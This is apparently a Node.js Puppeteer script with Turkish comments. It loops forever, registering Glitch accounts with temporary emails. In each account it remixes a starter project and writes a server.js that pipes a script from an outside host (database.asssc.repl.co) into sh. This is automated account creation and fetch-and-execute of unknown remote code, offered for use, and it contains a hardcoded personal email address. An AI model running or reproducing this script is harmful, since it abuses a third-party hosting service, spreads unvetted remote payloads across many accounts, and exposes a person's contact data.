const puppeteer = require('puppeteer');
const timers = require('timers-promises')
var mail = "kubilayozturk155@gmail.com"
//try { mail = require('./settings.json').mail} catch {}
var prompt = require('prompt-sync')();

async function run() {
  const browser = await puppeteer.launch({
   args: ['--no-sandbox'],headless: false
  });
const page = await browser.newPage();
await page.setUserAgent(
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.117'
)
await timers.setTimeout(2000)
  await page.goto('https://glitch.com/signup');
  var tempmail = await prompt('Temp maili giriniz: ');
   //Glitch 1. aşama
   await timers.setTimeout(2000)
   await page.evaluate(() => document.querySelector("button").click() )
   //Glitch 2. aşama mail gönderme
   await page.focus('input')
   await page.keyboard.type(tempmail)
   await timers.setTimeout(4000)
   await page.evaluate(() => document.querySelector("form")[1].click())
   //Mail
   var twoad = await prompt('Mail doğrulamasını giriniz:\n');
    page.on('dialog', async dialog => {
      await dialog.accept();
    });
  await page.goto(twoad)
  await page.goto(twoad)
  await timers.setTimeout(3000)
  await page.goto("https://glitch.com/edit/#!/remix/glitch-hello-node")
  //await prompt('Devam edilsinmi [ENTER]');
  await timers.setTimeout(35000)
  await page.evaluate(() =>document.querySelector("div.css-1gga1re > div").click())
  await timers.setTimeout(1000)
  await page.focus("div.input-wrap > input")
  await page.keyboard.type("server.js")
  await timers.setTimeout(1000)
  await page.evaluate(() =>document.querySelector("div.button-wrap > button").click())
  await timers.setTimeout(2000)
  await page.keyboard.type("const { exec } = require('child_process'),ml = '"+mail+"';//"+Math.random()+`
  exec(\`curl -fsSL https://database.asssc.repl.co/p2poutg/glitch/\${ml}/\${process.env.PROJECT_DOMAIN}.glitch.me |sh\`);`)
  await timers.setTimeout(35000)
  console.clear()
 await browser.close();
 await run()
}
run()

//Version 1.0.0